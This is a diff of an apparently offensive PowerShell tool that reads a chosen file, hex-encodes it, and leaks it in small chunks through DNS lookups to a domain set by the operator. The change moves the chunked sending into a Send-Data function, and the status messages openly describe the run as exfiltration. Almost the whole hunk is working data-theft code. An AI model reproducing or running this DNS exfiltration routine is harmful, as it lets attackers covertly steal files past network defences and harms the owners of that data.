@@ -27,53 +27,63 @@ function ConvertTo-Hex {
     }
 }
 
-Write-Host "[*] exfiltrating file $File"
-$bytes = [System.IO.File]::ReadAllBytes($File);
-$hex = New-Object System.Collections.Generic.List[System.Object];
+# function for performing DNS query
+function Send-Data {
+    Param(
+        $exfilString
+    )
 
-foreach ($b in $bytes)
-{
-    $h = ConvertTo-Hex $b;
-    #echo $b" - "$h;
-    $hex.Add($h);
-}
-
-Write-Host "[*] hex sample of file: " -NoNewLine
-$sample_length = [math]::min( 40, $hex.Count)
-for($i=0; $i -le $sample_length; $i++)
-{
-    Write-Host $hex[$i] -NoNewLine;
-}
-Write-Host ""
-
-# exfiltrate the file chunk-by-chunk
-$exfilLength = 63;
-$fileOffset = 0;
-$exfilCount = 0;
-$continue = $true;
-while ($continue)
-{
-    $exfilString = "$exfilCount-";
-    $exfilHexBytes = [math]::Floor(($exfilLength - $exfilString.Length) / 2);
-
-    #Write-Host "offset = $fileOffset, bytes = $exfilHexBytes"
-    if($fileOffset + $exfilHexBytes -gt $hex.Count)
-    {
-        $continue = $false;
-        $exfilHexBytes = $hex.Count - $fileOffset;
-    }
-    $exfilChunk = $hex.GetRange($fileOffset, $exfilHexBytes);
-    foreach($c in $exfilChunk)
-    {
+    foreach ($c in $hex) {
         $exfilString += $c;
     }
-    if($exfilString -ne "$exfilCount-") 
-    {
+    if ($exfilString -ne "$batch-") {
         $DomainToQuery = "$exfilString.$Subdomain.$Domain"
         Write-Host "[*] querying $DomainToQuery"
         Resolve-DnsName -type $QueryType $DomainToQuery -QuickTimeout -erroraction 'silentlycontinue'
     }
-
-    $fileOffset += $exfilHexBytes;
-    $exfilCount += 1;
 }
+
+
+Write-Host "[*] exfiltrating file $File"
+$bytes = [System.IO.File]::ReadAllBytes($File);
+$numBytes = $bytes.Count;
+$numQueries = [math]::Ceiling($bytes.Count / 64);
+Write-Host  "[*] read $numBytes bytes, exfiltration will take $numQueries queries"
+$hex = New-Object System.Collections.Generic.List[System.Object];
+
+Write-Host  "[*] starting exfiltration"
+$hex = New-Object System.Collections.Generic.List[System.Object];
+$batch = 0;
+$exfilLength = 63;
+$exfilString = "$batch-";
+$exfilHexBytes = [math]::Floor(($exfilLength - $exfilString.Length) / 2);
+foreach ($b in $bytes)
+{   
+    $h = ConvertTo-Hex $b;
+    #echo $b" - "$h;
+    $hex.Add($h);
+    
+    if($hex.Count -eq $exfilHexBytes) {
+        Send-Data $exfilString
+
+        #foreach ($c in $hex) {
+        #    $exfilString += $c;
+        #}
+        #if ($exfilString -ne "$batch-") {
+        #    $DomainToQuery = "$exfilString.$Subdomain.$Domain"
+        #    Write-Host "[*] querying $DomainToQuery"
+        #    Resolve-DnsName -type $QueryType $DomainToQuery -QuickTimeout -erroraction 'silentlycontinue'
+        #}
+        $hex.Clear();
+        $batch += 1;
+        $exfilString = "$batch-";
+        $exfilHexBytes = [math]::Floor(($exfilLength - $exfilString.Length) / 2);
+    }
+}
+
+# one last send
+if ($hex.Count -gt 0) {
+    Send-Data $exfilString
+}
+
+Write-Host  "[*] done exfiltration"
